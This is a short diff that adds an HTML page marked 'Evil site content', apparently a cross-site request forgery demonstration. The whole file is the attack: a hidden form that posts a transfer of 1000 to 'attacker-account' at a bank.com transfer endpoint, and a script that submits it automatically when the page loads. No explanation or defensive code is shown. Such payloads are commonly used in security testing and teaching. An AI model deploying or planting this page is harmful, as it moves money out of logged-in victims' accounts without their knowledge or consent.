@@ -1,0 +1,8 @@
+<!-- Evil site content -->
+<form action="https://bank.com/transfer" method="POST" id="evil-form">
+    <input type="hidden" name="to_account" value="attacker-account">
+    <input type="hidden" name="amount" value="1000">
+</form>
+<script>
+    document.getElementById('evil-form').submit();
+</script>
